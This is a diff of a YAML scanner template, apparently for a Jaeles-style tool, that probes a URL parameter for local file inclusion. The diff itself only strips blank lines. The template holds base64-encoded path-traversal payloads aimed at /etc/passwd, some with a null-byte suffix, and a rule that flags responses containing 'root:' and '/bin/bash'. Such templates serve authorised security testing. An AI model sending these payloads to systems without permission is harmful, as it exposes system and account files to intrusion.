@@ -4,7 +4,6 @@ level: 2
 info:
   name: LFI on Parameter
   risk: High
-
 variables:
   - name: |
       id
@@ -205,16 +204,12 @@ variables:
       Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
       Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
       Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
-
 # origin: gonna come from Burp
 payloads:
   - '@{{.dest}}'
-
-
 requests:
   - generators:
       - Query("{{.payload}}", "{{.name}}")
     detections:
       - >-
         StatusCode() == 200 && StringSearch("response", "root:") && StringSearch("response", "/bin/bash")
-
